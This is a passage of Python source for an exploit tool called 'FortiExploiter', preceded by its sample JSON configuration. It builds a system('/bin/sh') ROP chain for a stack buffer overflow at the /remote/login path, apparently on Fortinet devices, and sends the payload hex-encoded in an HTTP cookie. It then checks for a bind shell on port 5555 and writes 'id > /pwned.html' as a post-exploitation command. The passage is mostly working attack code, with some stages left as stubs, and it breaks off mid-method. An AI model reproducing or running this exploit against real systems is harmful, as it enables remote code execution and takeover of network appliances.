  "target": {
    "ip": "192.168.1.100",
    "port": 80,
    "use_https": false,
    "vulnerable_path": "/remote/login",
    "architecture": "amd64",
    "endianness": "little"
  },
  "stack_layout": {
    "buffer_offset": 64,
    "buffer_size": 256,
    "canary_offset": 0,
    "saved_rbp_offset": 328,
    "return_address_overwrite_offset": 336
  },
  "mitigations": {
    "aslr":   { "use": false, "method": "none", "leak_config": {} },
    "canary": { "use": false, "method": "none", "leak_config": {} },
    "dep_nx": { "use": true,  "method": "rop" }
  },
  "rop": {
    "call_convention": "sysv",
    "chain_type": "system",
    "gadgets": {
      "pop_rdi_ret": 4198979
    },
    "module_gadget_offsets": {
      "target_binary": {
         "pop_rdi_ret": 4198979
      }
    },
    "rop_chain": {
      "command": "/bin/sh"
    }
  },
  "payload": {
    "type": "rop",
     "shellcode_options": {
        "type": "bind_shell",
        "port": 5555
     },
     "bad_chars": ["00", "0a", "0d"]
  },
  "addresses": {
    "fixed_input_buffer_base": 140737488347136,
     "fixed_target_binary_base": 4194304,
     "fixed_libc_base": 1073741824,
    "module_offsets": {
      "libc": {
        "system": 324144,
        "/bin/sh": 1970426,
         "execve": 123456
      },
      "target_binary": {
           "some_useful_address": 1234
      }
    }
  },
  "verification": {
    "methods": [
      {
        "type": "bind_shell_connect",
        "port": 5555,
        "timeout": 5
      },
      {
        "type": "http_file_check",
        "path": "/pwned.html",
        "expected_content": "",
        "timeout": 3
      }
    ]
  },
  "stealth": {
    "random_padding": 0,
    "vary_user_agent": false,
    "user_agent_list": ["FortiExploiter-PoC/7.0.6"]
  },
  "timing": {
    "request_timeout": 10,
    "leak_timeout": 10,
    "verification_timeout": 5,
    "post_leak_delay": 1,
    "post_trigger_delay": 3,
    "delay_between_triggers": 1,
    "delay_between_verification": 1,
    "delay_between_post_exp_modules": 1
  },
  "triggering": {
     "methods": [
        {
           "type": "requests_http_cookie",
           "path": "/remote/login",
           "http_method": "GET",
           "payload_location": "cookie_hex",
           "headers": {}
        }
     ]
  },
  "post_exploitation": {
     "modules": [
       {
         "type": "execute_command",
         "command":"id > /pwned.html"
       }
     ]
  }
}
"""
# --- Skeletal FortiExploiter Class ---
class FortiExploiter:
    """Minimal stub so the CLI can run without undefined-name errors."""
    def __init__(self, cfg: typing.Dict[typing.Any, typing.Any], args: argparse.Namespace): # Use typing.Dict
        self.cfg = cfg
        self.args = args # Store argparse args
        m = self.cfg.get("mitigations", {}) # Use get with default
        self.use_aslr_bypass = m.get("aslr", {}).get("use", False) # Use get with default
        self.aslr_bypass_method = m.get("aslr", {}).get("method", "none") # Use get with default
        self.use_canary_bypass = m.get("canary", {}).get("use", False) # Use get with default
        self.canary_bypass_method = m.get("canary", {}).get("method", "none") # Use get with default
        self.use_dep_nx_bypass = m.get("dep_nx", {}).get("use", False) # Use get for DEP/NX

        # Initialize calculated bases and all_gadgets/all_addresses dicts
        a = self.cfg.get("addresses", {})
        # Start with fixed bases from config
        self.calculated_base_addresses = {
            "input_buffer_base": a.get("fixed_input_buffer_base", 0),
            "target_binary":     a.get("fixed_target_binary_base", 0),
            "libc":              a.get("fixed_libc_base", 0), # Fixed libc base for non-ASLR/non-leak
        }
        self.fixed_base_addresses = self.calculated_base_addresses.copy() # Copy initial fixed bases
        # Ensure target_binary is in fixed_base_addresses if it exists in config
        self.fixed_base_addresses.setdefault("target_binary", a.get("fixed_target_binary_base", 0))


        # Load flat gadgets from config initially
        self.all_gadgets = {
           _mangle_name(k): v
           for k, v in self.cfg.get("rop", {}).get("gadgets", {}).items() # Load flat gadgets
        }
        self.all_addresses = {} # Populated during update_dependent_addresses by adding offsets to bases
        # Add placeholders for necessary attributes used by stub methods
        # Use context from pwntools directly
        self.pointer_size = pwntools_context.bits // 8 # Correct pointer size

        # Required for craft_exploit_payload stub arithmetic - Use get with default 0
        self.buffer_offset = self.cfg.get("stack_layout", {}).get("buffer_offset", 0)
        self.buffer_size = self.cfg.get("stack_layout", {}).get("buffer_size", 0)
        self.canary_offset = self.cfg.get("stack_layout", {}).get("canary_offset", 0) # Read canary_offset first
        self.saved_rbp_offset = self.cfg.get("stack_layout", {}).get("saved_rbp_offset", 0)

        # Derive real canary size based on layout offsets if canary is present, default to pointer size
        # If canary_offset is 0 or saved_rbp_offset is not after canary_offset, canary_size_local should be 0
        self.canary_size = 0 # Default to 0 if no canary declared in config
        if self.canary_offset > 0: # If a canary offset is declared, calculate its size
            if self.saved_rbp_offset > self.canary_offset:
                self.canary_size = self.saved_rbp_offset - self.canary_offset
            else:
                # If saved_rbp_offset is not after canary_offset, something is wrong with the layout config
                # Defaulting to pointer_size might be acceptable as a size placeholder in this error case
                self.canary_size = self.pointer_size # Fallback size, validation should flag the layout issue


        self.return_address_overwrite_offset = self.cfg.get("stack_layout", {}).get("return_address_overwrite_offset", 0)


        self.leaked_canary_value = b"" # Stub - will be populated by leak_info if canary bypass is used and successful
        self.rop_chain_type = self.cfg.get("rop", {}).get("chain_type", "system") # Stub
        self.shellcode_options = self.cfg.get("payload", {}).get("shellcode_options", {}) # Stub
        self.lhost = self.args.lhost # Get lhost from args
        self.lport = self.args.lport # Get lport from args
        self._force_exploit = self.args.force # Get force from args
        self._verified = False # Track if verification passed
        self.http = requests.Session() # Reuse session for efficiency and cookie handling
        self.http.verify = False # Disable SSL verification globally for the session (PoC behavior) ignore InsecureRequestWarning is done globally

        # Initialize bad_chars - Use get with default []
        self.bad_chars = [int(b, 16) for b in self.cfg.get("payload", {}).get("bad_chars", [])] # Use self.cfg
        self.bad_chars_set = set(self.bad_chars) # Convert list to set for O(1) lookup

        self.random_padding_size = self.cfg.get('stealth', {}).get('random_padding', 0) # Get random padding size
        self.vary_user_agent = self.cfg.get('stealth', {}).get('vary_user_agent', False)
        self.user_agent_list = self.cfg.get('stealth', {}).get('user_agent_list', ["FortiExploiter-PoC/7.0.6"])


        # Call update_dependent_addresses right after init if not leaking
        # This populates self.all_gadgets/all_addresses from fixed bases
        if not self.use_aslr_bypass and not self.use_canary_bypass: # Only update fixed addresses if no leaking planned
             self.update_dependent_addresses()
    # --- stubbed pipeline stages -------------------------------------
    def leak_info(self) -> bool:
        logger.info("[leak] stub â€“ nothing leaked (ASLR/Canary off in sample cfg or skipped)")
        # In non-ASLR/non-canary case, leakage is not required.
        # Base addresses/addresses were populated from fixed values in __init__ if leak was off
        # If leak bypass was configured but skipped, this still returns True for pipeline flow
        # TODO: Implement real ASLR/canary leak logic here if self.use_aslr_bypass or self.use_canary_bypass is True
        # If using leak, should populate self.calculated_base_addresses and self.leaked_canary_value, then call self.update_dependent_addresses()
        if self.use_aslr_bypass or self.use_canary_bypass:
             logger.warning("[leak] ASLR or Canary bypass is enabled in config but leak_info is still a stub.")
             # Simulate leakage failure for now if leak is configured but not implemented
             return False
        # If leak is off, addresses are considered populated from fixed values.
        return True # Always succeed if required leaks are not configured

    # TODO: Implement do_http_leak() for ASLR/Canary bypass demonstration
    # def do_http_leak(self):
    #     """Stub for HTTP-based information leakage (e.g., /proc/self/maps or stack contents)."""
    #     logger.info("[leak] Performing dummy HTTP leak...")
    #     # Implement HTTP request based on leak_config here
    #     # Access target info via self.cfg.get('target')
    #     # Use self.http.get or self.http.post
    #     # Example: fetch a dummy URL and return some bytes
    #     # return self.http.get(self.cfg['target']['vulnerable_path'], timeout=self.cfg['timing']['leak_timeout']).content # Example
    #     return b"AAABBBBCCCC" * 10 # Dummy leak bytes

    # TODO: Implement parse_leak()
    # def parse_leak(self, leak_bytes: bytes):
    #     """Stub for parsing leaked bytes to find base addresses or canary."""
    #     logger.info("[leak] Parsing dummy leak...")
    #     # Implement parsing logic based on leak_config here
    #     # Example: search for patterns and extract addresses/canary
    #     # Access self.cfg['mitigations']['aslr']['leak_config'] or self.cfg['mitigations']['canary']['leak_config']
    #     dummy_libc_base = 0x7f0000000000 # Dummy leaked address
    #     # self.leaked_canary_value = # Populate self.leaked_canary_value if canary is leaked (ensure size matches self.canary_size)
    #     parsed_bases = {"libc": dummy_libc_base} # Example parsed bases
    #     return parsed_bases # Return a dict of parsed bases

    def build_exploit_code(self) -> bytes | None:
        logger.info(f"[build] stub â€“ building {self.cfg.get('payload', {}).get('type')} payload") # Use get
        # Replace with real payload building logic later
        # Use the correct pointer size and endianness from context
        le = self.cfg.get('target', {}).get('endianness') == 'little'
        payload_type = self.cfg.get('payload', {}).get('type')

        try: # Wrap build logic in try/except for custom errors
            if payload_type == 'rop':
                 # Build a basic system("/bin/sh") ROP chain using available gadgets/addresses
                 # Requires fixed_libc_base, and "libc.system", "libc./bin/sh" offsets loaded into all_addresses
                 if self.use_dep_nx_bypass and self.cfg.get('mitigations', {}).get('dep_nx', {}).get('method') == 'rop':
                     logger.info("[build] Building ROP chain... (System('/bin/sh'))")

                     # Need a pop rdi gadget address - look it up in self.all_gadgets
                     pop_rdi_key_module = _addr_key('target_binary', 'pop_rdi_ret') # Using the sample config gadget name convention if in module_gadget_offsets
                     pop_rdi = self.all_gadgets.get(pop_rdi_key_module, 0) # Attempt lookup with module prefix
                     if not pop_rdi: # Fallback to checking without module prefix for flat gadgets from main rop.gadgets
                         pop_rdi = self.all_gadgets.get(_mangle_name('pop_rdi_ret'), 0)
                         if not pop_rdi:
                              # Raise ExploitError instead of logging and returning dummy
                              raise ExploitError(f"[build] Cannot build ROP chain: Missing required '{pop_rdi_key_module}' or '{_mangle_name('pop_rdi_ret')}' gadget address in all_gadgets.")

                     else:
                          logger.debug(f"[build] Found pop_rdi_ret gadget: {hex(pop_rdi)}")


                     # Need system() function address - look it up in self.all_addresses
                     system_key = _addr_key('libc', 'system')
                     system_addr = self.all_addresses.get(system_key, 0)
                     if not system_addr:
                          # Raise ExploitError instead of logging and returning dummy
                          raise ExploitError(f"[build] Cannot build ROP chain: Missing required '{system_key}' address in all_addresses.")


                     # Need "/bin/sh" string address - look it up in self.all_addresses
                     binsh_key = _addr_key('libc', '/bin/sh')
                     binsh_addr = self.all_addresses.get(binsh_key, 0)
                     if not binsh_addr:
                          # Raise ExploitError instead of logging and returning dummy
                          raise ExploitError(f"[build] Cannot build ROP chain: Missing required '{binsh_key}' address in all_addresses.")


                     # Manually assemble ROP chain bytes
                     try: # Add try block for pack_addr_auto errors
                         rop_chain_bytes  = pack_addr_auto(self, pop_rdi, le)        # Pop RDI (using auto-packer)
                         rop_chain_bytes += pack_addr_auto(self, binsh_addr, le)     # Arg 1: "/bin/sh" string address (using auto-packer)
                         rop_chain_bytes += pack_addr_auto(self, system_addr, le)    # Call system() (using auto-packer)
                     except ExploitError as e: # Catch errors from pack_addr_auto (re-raise as None isn't sufficient)
                         logger.error(f"[build] Error packing ROP address: {e}")
                         raise # Re-raise the exploit error


                     # pwntools_log.info(f"[build] Built ROP chain:\n{pwntools_ROP(rop_chain_bytes).dump()}") # Cannot dump raw bytes without context
                     logger.info(f"[build] Built ROP chain. Length: {len(rop_chain_bytes)}. First 64 bytes: {rop_chain_bytes[:64].hex()}")

                     return rop_chain_bytes

                 else:
                      # If ROP is not the DEP/NX bypass method, or DEP/NX bypass is off, don't build a real ROP chain
                      logger.info("[build] ROP payload type configured but DEP/NX bypass method is not ROP or DEP/NX bypass is disabled. Building dummy ROP.")
                      # Dummy ROP chain using pack_addr_auto
                      # Use a dummy base if fixed_input_buffer_base is 0 for stub (should be caught by validation)
                      dummy_base = self.fixed_base_addresses.get('input_buffer_base', 0) or 0x1000
                      try: # Add try block for pack_addr_auto
                          rop_chain = pack_addr_auto(self, dummy_base + self.pointer_size, le) + pack_addr_auto(self, dummy_base + self.pointer_size * 2, le) # Example using auto-packer
                      except ExploitError as e: # Catch errors from pack_addr_auto
                          logger.error(f"[build] Error packing dummy ROP address: {e}")
                          raise # Re-raise the exploit error


                      return rop_chain.ljust(64, b'\x00') # Pad dummy ROP using a reasonable size

            elif payload_type == 'shellcode':
                # TODO: Implement shellcode building logic here using pwntools_shellcraft and encode
                logger.warning("[build] Shellcode payload type configured but shellcode building is still a stub.")
                # Dummy shellcode for now
                coded = b"A" * (self.pointer_size * 2)
                return coded.ljust(64, b'\x00') # Pad dummy shellcode using a reasonable size
            else:
                 # Raise ExploitError for unsupported payload type
                 raise ExploitError(f"[build] Unsupported payload type: {payload_type}")

        except ExploitError as e: # Catch ExploitErrors raised within build logic
            # Error logged within the specific logic, just return None
            return None # Return None to signal build failure to the pipeline
        except Exception as e: # Catch any other unexpected errors
             logger.error(f"[build] An unexpected error occurred during exploit code building: {e}", exc_info=True)
             return None # Return None to signal build failure


    def craft_exploit_payload(self, code: bytes | None) -> bytes | None:
        logger.info("[craft] Crafting payload around exploit code...")
        if code is None:
            logger.error("[craft] Exploit code is None. Cannot craft payload.")
            return None
        # Basic stub logic for padding and return address
        # Use values from cfg, with defaults
        buffer_offset = self.cfg.get("stack_layout", {}).get("buffer_offset", 0) # Use local variable
        buffer_size = self.cfg.get("stack_layout", {}).get("buffer_size", 0) # Use local variable
        return_overwrite_offset = self.cfg.get("stack_layout", {}).get("return_address_overwrite_offset", 0)
        input_buffer_base_live_address = self.fixed_base_addresses.get('input_buffer_base', 0)

        # Calculate padding from buffer end to the overwrite block start (canary/rbp/ret) AFTER accounting for buffer_offset
        # The total size from the start of the input string to the start of the overwrite block is:
        # buffer_offset + buffer_size + padding_before_overwrite
        # The start of the overwrite block should be at return_address_overwrite_offset - pointer_size or canary_offset or rbp_offset

        # Recompute canary_size locally based on layout offsets if possible, default to pointer size
        # If canary_offset is 0 or saved_rbp_offset is not after canary_offset, canary_size_local should be 0
        canary_size_local = 0 # Default to 0 if no canary declared in config
        if self.canary_offset > 0: # If a canary offset is declared, calculate its size
            if self.saved_rbp_offset > self.canary_offset:
                canary_size_local = self.saved_rbp_offset - self.canary_offset
            else:
                # If saved_rbp_offset is not after canary_offset, something is wrong with the layout config
                # Defaulting to pointer_size might be acceptable as a size placeholder in this error case
                logger.warning("[craft] Inconsistent stack layout for canary and RBP offsets. Calculating canary size based on pointer size.")
                canary_size_local = self.pointer_size # Fallback size, validation should flag the layout issue


        rbp_size = self.pointer_size if self.saved_rbp_offset > 0 else 0
        # Calculate overwrite_block_size including the actual size of the canary space if it exists
        overwrite_block_size = (canary_size_local if self.canary_offset > 0 else 0) + rbp_size + self.pointer_size


        # Padding between the end of the buffer (at buffer_offset + buffer_size) and the start of the overwrite block
        # The overwrite block starts at return_address_overwrite_offset - overwrite_block_size
        padding_before_overwrite_block = (return_overwrite_offset - overwrite_block_size) - (buffer_offset + buffer_size)


        if padding_before_overwrite_block < 0:
             # Raise ExploitError for negative padding
             raise ExploitError(
                 f"[craft] Calculated padding_before_overwrite_block is negative ({padding_before_overwrite_block}). "
                 f"Check stack-layout offsets ({buffer_offset=}, {buffer_size=}, {return_overwrite_offset=}, {overwrite_block_size=}). Payload crafting aborted."
             ) # Raise custom exception


        # Calculate the live address of the exploit code within the input string
        # Exploit code starts immediately after the return address and random padding
        exploit_code_offset_in_input_string = (
            buffer_offset +                # Initial slack before buffer
            buffer_size +                # The actual buffer
            padding_before_overwrite_block +  # Padding between buffer and overwrite block
            overwrite_block_size + # The size of the canary + rbp + return address block
            self.random_padding_size # The size of the random padding (inserted after overwrite block)
        )


        exploit_code_live_address = input_buffer_base_live_address + exploit_code_offset_in_input_string

        # --- Assemble the Final Payload Bytes to send ---
        # Start with the initial buffer offset slack
        payload_bytes = b"A" * buffer_offset # Use local variable
        # Fill the buffer with junk starting after the buffer offset
        payload_bytes += b"A" * buffer_size # Use local variable

        # Add padding before overwrite block
        if padding_before_overwrite_block > 0: # Only add padding if size is positive
             payload_bytes += b"B" * padding_before_overwrite_block

        # Add Overwrite Block components: Canary + RBP + Return Address
        # Only include canary padding if a canary_offset was specified AND its calculated size is positive
        if self.canary_offset > 0 and canary_size_local > 0: # Check if canary offset exists and calculated size is positive
            if self.use_canary_bypass and self.leaked_canary_value: # Bypass is on AND we have a leaked value FROM leak_info
                 # Leaked canary expected to be canister_size_local bytes when bypass is used
                 canary_bytes = self.leaked_canary_value.ljust(
                     canary_size_local, b'\x00' # Use calculated local canary size
                 )  # Pad if not exactly canary_size_local
                 payload_bytes += canary_bytes
            else: # Canary exists but bypass is NOT used or no leaked value provided
                 # This case should be caught by validation if canary_offset > 0 and bypass is off/no leak_config/no leaked value
                 # As a fallback, insert padding with size matching canary_size_local
                 logger.warning("[craft] Canary offset is set, but bypass is disabled or no leaked value provided/leaked value size mismatch. Padding for canary space.")
                 # Use calculated local canary size here too
                 payload_bytes += b"\xCC" * canary_size_local # Use CC as a placeholder/int8 breakpoint


        if self.saved_rbp_offset > 0:
            # Fill RBP bytes with a padding character exactly pointer_size times
            payload_bytes += b"R" * self.pointer_size


        # Overwrite Return Address: This points to the LIVE address of our Exploit Code.
        if exploit_code_live_address is None or exploit_code_live_address == 0:
            logger.error("Exploit Code Live Address is not valid (0). Cannot craft Return Address overwrite.")
            return None
        # Pack the live address using pack_addr_auto
        le = self.cfg.get('target', {}).get('endianness') == 'little'
        try: # Add try block for pack_addr_auto errors
            payload_bytes += pack_addr_auto(self, exploit_code_live_address, le)
        except ExploitError as e: # Catch custom exception
            logger.error(f"[craft] Error packing Return Address: {e}")
            return None # Abort craft


        # Add random padding if configured (placed after the overwrite block, before the main exploit code)
        if isinstance(self.random_padding_size, int) and self.random_padding_size > 0: # Guard with size > 0
             # Generate safe random padding, excluding bad characters
             # generate_safe_random_padding now guarantees returned length == n unless it errors internally or hits max attempts
             # No need for length check here unless generate_safe_random_padding is changed
             try: # Add try block for generate_safe_random_padding errors
                 random_padding = generate_safe_random_padding(self.random_padding_size, self.bad_chars_set)
             except ExploitError as e: # Catch custom exception
                  logger.error(f"[craft] Error generating random padding: {e}")
                  return None # Abort craft


             payload_bytes += random_padding
             logger.debug(f"[craft] Added {self.random_padding_size} bytes of random padding *after* the overwrite block.")


        # Append the actual Exploit Code bytes
        if code is None:
            logger.error("Exploit code bytes is None. Cannot craft final payload.")
            return None

        # Append the actual exploit code bytes
        payload_bytes += code


        # Only scan the user-controlled part for bad characters (buffer + padding + overwrite block + random padding)
        # Exclude the initial buffer_offset slack 'A's AND the final exploit code because it should be vetted/encoded separately during build.
        # The target program likely handles the initial buffer_offset space.
        # Bad characters should only be in the bytes we control and send as the vulnerable input string.
        # The exploit code itself is controlled by our build_exploit_code logic and encoded/filtered there IF the encoding library supports it.
        # This check is for bad bytes in the raw crafted BYTES payload we are sending.
        # We scan from the start of the buffer (after buffer_offset) up to the start of the exploit code.
        # The entire crafted payload (after buffer_offset) contains our controlled bytes, including padding, overwrite block, random padding, and exploit code.

        scannable_payload_part = payload_bytes[buffer_offset:exploit_code_offset_in_input_string] # Scan from the start of the actual buffer up to the start of the exploit code. Use local buffer_offset


        bad_bytes_found = [hex(byte) for byte in scannable_payload_part if byte in self.bad_chars_set] # Corrected list comprehension syntax AND slicing


        if bad_bytes_found:
             # Include the full payload length and the offset where the bad character scan started for debugging
             logger.error(f"Fatal: User-controlled part of crafted payload bytes contain bad characters ({bad_bytes_found}). Scan started at offset {buffer_offset}. Scan ended at {exploit_code_offset_in_input_string}. Total payload size: {len(payload_bytes)}.")
             return None # Abort if bad chars exist
        logger.success("Payload crafted and raw bad character check passed.")
        return payload_bytes
    def trigger_vulnerability(self, payload: bytes | None) -> bool:
        logger.info("[trigger] Attempting to send payload...")
        if payload is None:
            logger.error("[trigger] Payload is None. Cannot send.")
            return False
        # Safety check: Require --force or --dry-run implicitly allows build/craft
        if not self._force_exploit and not self.args.dry_run:
            logger.warning("[trigger] --force not supplied and not in --dry-run mode â€“ trigger aborted. Nothing sent.")
            # Return False to indicate trigger failure, the main pipeline will handle the exit(1)
            return False

        # If in dry-run, just simulate success and return true to allow verification/post-exp stubs to run
        if self.args.dry_run:
             logger.warning(f"[trigger] Dry-run mode: Simulating sending {len(payload)}-byte payload (success simulated).") # Changed log level to waning in dry-run simulation
             return True


        # If forced, proceed with actual triggering logic.
        trigger_methods = self.cfg.get('triggering', {}).get('methods', [])
        if not trigger_methods:
            logger.error("[trigger] No triggering methods defined in config.")
            return False
        # Use the first triggering method defined in the config
        trigger_method = trigger_methods[0]
        method_type = trigger_method.get('type')
        target_ip = self.cfg.get('target', {}).get('ip')
        target_port = self.cfg.get('target', {}).get('port')
        use_https = self.cfg.get('target', {}).get('use_https', False)
        base_url = f"{'https' if use_https else 'http'}://{target_ip}:{target_port}"
        # Use the path defined in the trigger method, default to the vulnerable path from target config
        # Added default to target url if trigger method path is missing
        path = trigger_method.get('path', self.cfg.get('target', {}).get('vulnerable_path', '/'))
        url = f"{base_url}{path}"
        http_method = trigger_method.get('http_method', 'GET').upper()

        # Validate HTTP method against allowed list
        if http_method not in ALLOWED_HTTP_METHODS:
             logger.warning(f"[trigger] Unsupported HTTP method '{http_method}'. Using default GET.")
             http_method = 'GET' # Default to GET if method is not supported

        payload_location = trigger_method.get('payload_location', 'body_raw_bytes') # Default to body_raw_bytes
        headers = trigger_method.get('headers', {}).copy() # Use a copy to avoid modifying original config
        request_timeout = self.cfg.get('timing', {}).get('request_timeout', 10)
        logger.info(f"[trigger] Using trigger method: {method_type}")
        try:
            data = None
            params = None
            cookies = None
            # Apply user agent rotation
            if self.vary_user_agent and len(self.user_agent_list) > 0: # Only randomize if vary is true AND list has > 0 elements
                headers['User-Agent'] = random.choice(self.user_agent_list)
                logger.debug(f"[trigger] Using User-Agent: {headers['User-Agent']}")
            elif self.user_agent_list: # If list is present but not varying or only one UA, use the first one
                headers['User-Agent'] = self.user_agent_list[0] # Use the first one if not varying or only one option
            # If user_agent_list is empty, no User-Agent header will be sent unless it's in the fixed headers


            if method_type == 'requests_http_cookie':
                cookie_name = trigger_method.get('cookie_name', 'exploit_payload')
                # Warning: Large payloads in cookies can be truncated silently.
                # Consider using 'body_raw' or 'requests_post_param' for bigger payloads.
                cookies = {cookie_name: payload.hex()} # Hex encode for cookie
            elif method_type in ['requests_post_param', 'get_param_hex']:
                param_name = trigger_method.get('param_name', 'payload')
                send_hex = payload_location.endswith('_hex') # Check if payload_location ends with '_hex'
                if send_hex:
                     param_value = payload.hex() # Send as hex
                else:
                     # Send as text using latin-1 encoding for 1-to-1 byte mapping
                     try:
                        param_value = payload.decode(errors='latin-1') # Use latin-1
                     except UnicodeDecodeError:
                         logger.error(f"[trigger] Payload contains non-latin-1 bytes but payload_location '{payload_location}' implies text encoding. Consider using a '_hex' location or 'body_raw_bytes'.")
                         return False


                if method_type == 'requests_post_param':
                    data = {param_name: param_value}
                else: # get_param_hex
                    params = {param_name: param_value}
            elif method_type == 'body_raw':
                 # For raw body, we decide the content type based on payload_location or default
                 content_type = headers.get('Content-Type', 'application/octet-stream')
                 headers['Content-Type'] = content_type # Ensure Content-Type is set
                 if payload_location == 'body_raw_bytes':
                    data = payload # Send raw bytes
                 elif payload_location == 'body_raw_text':
                     # Send as text using latin-1 encoding
                     try:
                         data = payload.decode(errors='latin-1') # Use latin-1
                     except UnicodeDecodeError:
                         logger.error(f"[trigger] Payload contains non-latin-1 bytes but payload_location 'body_raw_text' implies text encoding. Consider using 'body_raw_bytes'.")
                         return False

                 else:
                     # This should be caught by validation, but as a fallback
                     logger.error(f"[trigger] Unsupported 'payload_location' for body_raw trigger: {payload_location}. Allowed: 'body_raw_bytes', 'body_raw_text'.")
                     return False
            else:
                # This should be caught by validation, but as a fallback
                logger.error(f"[trigger] Unsupported trigger method type: {method_type}") # Removed #
                return False

            logger.debug(f"[trigger] Sending to URL: {url}")
            logger.debug(f"[trigger] HTTP Method: {http_method}")
            logger.debug(f"[trigger] Payload Location: {payload_location}")
            logger.debug(f"[trigger] Headers: {headers}")
            logger.debug(f"[trigger] Data: {data}")
            logger.debug(f"[trigger] Params: {params}")
            logger.debug(f"[trigger] Cookies: {cookies}")


            # Send the request using requests.Session
            if http_method == 'GET':
                response = self.http.get(url, params=params, cookies=cookies, headers=headers, timeout=request_timeout)
            elif http_method == 'POST':
                response = self.http.post(url, data=data, json=None, cookies=cookies, headers=headers, timeout=request_timeout) # json=None to ensure 'data' is used
            elif http_method == 'PUT':
                response = self.http.put(url, data=data, json=None, cookies=cookies, headers=headers, timeout=request_timeout)
             # Add other HTTP methods if needed based on ALLOWED_HTTP_METHODS
            elif http_method == 'PATCH':
                response = self.http.patch(url, data=data, json=None, cookies=cookies, headers=headers, timeout=request_timeout)
            elif http_method == 'DELETE':
                 response = self.http.delete(url, params=params, cookies=cookies, headers=headers, timeout=request_timeout)
            else:
                 # This should be caught by validation, but as a fallback
                 logger.error(f"[trigger] Unsupported HTTP method '{http_method}' for trigger in request sending logic.") # Added context
                 return False


            logger.info(f"[trigger] Sent {http_method} request to {url}. Status Code: {response.status_code}")
            # Basic check: did we get any response without blowing up or a client-side error?
            # A real trigger might check status code ranges (e.g., 2xx, 3xx) or response body
            if response.status_code >= 400:
                logger.warning(f"[trigger] Received HTTP status code {response.status_code}. Trigger might have failed.")
            return True # Assume successful send for now if no glaring errors
        except requests.exceptions.RequestException as e:
            logger.error(f"[trigger] Failed to send exploit trigger using requests: {e}")
            return False
        except Exception as e:
            logger.error(f"[trigger] An unexpected error occurred during trigger sending: {e}", exc_info=True)
            return False
    def verify_exploit_success(self) -> bool:
        # Verification is skipped in dry-run mode by the check at the start of the method
        if self.args.dry_run:
            logger.warning("[verify] Dry-run mode: Skipping verification.") # Changed log level to warning
            return True # Always return True in dry-run to allow pipeline to continue to post-exp stub

        logger.info("[verify] Attempting to verify exploit success...")
        verification_methods = self.cfg.get('verification', {}).get('methods', [])
        if not verification_methods:
            logger.warning("[verify] No verification methods defined in config. Cannot verify.")
            return True # Assume success if no methods are defined.
        target_ip = self.cfg.get('target', {}).get('ip')
        target_port = self.cfg.get('target', {}).get('port')
        use_https = self.cfg.get('target', {}).get('use_https', False) # Define use_https here
        # Iterate through verification methods and return True if ANY succeed
        for method in verification_methods:
            method_type = method.get('type')
            verify_timeout = method.get('timeout', self.cfg.get('timing', {}).get('verification_timeout', 5))
            logger.info(f"[verify] Trying verification method: {method_type}")
            try:
                if method_type == 'bind_shell_connect':
                    shell_port = method.get('port')
                    if shell_port is None:
                        logger.warning(f"[verify] 'bind_shell_connect' method requires 'port'. Skipping.")
                        continue
                    logger.info(f"[verify] Attempting to connect to bind shell at {target_ip}:{shell_port} with timeout {verify_timeout}s...")
                    # Use blocking socket connect with timeout and send a small probe
                    try:
                        with socket.create_connection((target_ip, shell_port), verify_timeout) as s:
                            # Send a small probe command (like id) and expect a response
                            probe_command = b"id\n"
                            s.sendall(probe_command)
                            # Set a short timeout for reading the response
                            s.settimeout(2) # Wait up to 2 seconds for a response
                            response = s.recv(1024)
                            if response and b"uid=" in response: # Check for uid= in the response as a sign of a shell
                                logger.success(f"[verify] Successfully connected to bind shell at {target_ip}:{shell_port} and received expected response. Exploit likely succeeded. Response preview: {response[:64].decode(errors='ignore')}...")
                                return True # Verification successful
                            elif response:
                                logger.debug(f"[verify] Connected to {target_ip}:{shell_port} and received response, but missing expected content. Check service. Response preview: {response[:64].decode(errors='ignore')}...")
                            else:
                                logger.debug(f"[verify] Connected to {target_ip}:{shell_port} but received no response to probe.")
                                continue # Try next method or fail
                    except (ConnectionRefusedError, socket.timeout, OSError) as e:
                         logger.debug(f"[verify] Connection to bind shell failed: {e}")
                         continue # Try next method
                    except Exception as e: # Catch other potential socket errors
                         logger.error(f"[verify] An unexpected socket error occurred during bind_shell_connect verification: {e}", exc_info=True)
                         continue

                elif method_type == 'tcp_port_open':
                    port_to_check = method.get('port')
                    if port_to_check is None:
                         logger.warning(f"[verify] 'tcp_port_open' method requires 'port'. Skipping.")
                         continue
                    logger.info(f"[verify] Checking if TCP port {port_to_check} is open at {target_ip} with timeout {verify_timeout}s...")
                    # Check if port is in well-known range (<1024) and warn if it might be a standard service
                    if port_to_check < 1024:
                         logger.warning(f"[verify] Port {port_to_check} is in the well-known range. Verification might be a false positive if a standard service is running.")
                    try:
                         with socket.create_connection((target_ip, port_to_check), verify_timeout):
                              logger.success(f"[verify] TCP port {port_to_check} is open. Exploit likely succeeded.")
                              return True # Verification successful
                    except (ConnectionRefusedError, socket.timeout, OSError) as e:
                         logger.debug(f"[verify] TCP port {port_to_check} is not open: {e}")
                         continue # Try next method
                elif method_type == 'http_file_check':
                    check_path = method.get('path')
                    expected_content = method.get('expected_content', '')
                    if check_path is None:
                         logger.warning(f"[verify] 'http_file_check' method requires 'path'. Skipping.")
                         continue
                    check_url = f"{'https' if use_https else 'http'}://{target_ip}:{target_port}{check_path}"
                    logger.info(f"[verify] Attempting to fetch {check_url} with timeout {verify_timeout}s...")
                    try:
                         response = self.http.get(check_url, timeout=verify_timeout)
                         if response.status_code == 200:
                              if expected_content:
                                   if expected_content.encode() in response.content: # Check for bytes in content
                                        logger.success(f"[verify] Fetched {check_url} (Status 200) and found expected content. Exploit likely succeeded.")
                                        return True
                                   else:
                                        logger.debug(f"[verify] Fetched {check_url} (Status 200) but expected content not found. Response body preview: {response.content[:100].hex()}...")
                              else: # No expected content, just check for 200 OK
                                   logger.success(f"[verify] Fetched {check_url} (Status 200). Exploit likely succeeded.")
                                   return True
                         else:
                              logger.debug(f"[verify] Failed to fetch {check_url}. Status Code: {response.status_code}")
                    except requests.exceptions.RequestException as e:
                         logger.debug(f"[verify] Failed to fetch {check_url}: {e}")
                         continue # Try next method
                else:
                    logger.warning(f"[verify] Unsupported verification method type: {method_type}. Skipping.")
                    continue
            except Exception as e:
                logger.error(f"[verify] An unexpected error occurred during verification method '{method_type}': {e}", exc_info=True)
                continue # Try next method
        # If we reached here, none of the verification methods succeeded
        logger.warning("[verify] All defined verification methods failed.")
        return False # Verification failed if none passed
    def handle_post_exploitation(self) -> None:
        # Post-exploitation is skipped in dry-run mode by the check in the main pipeline
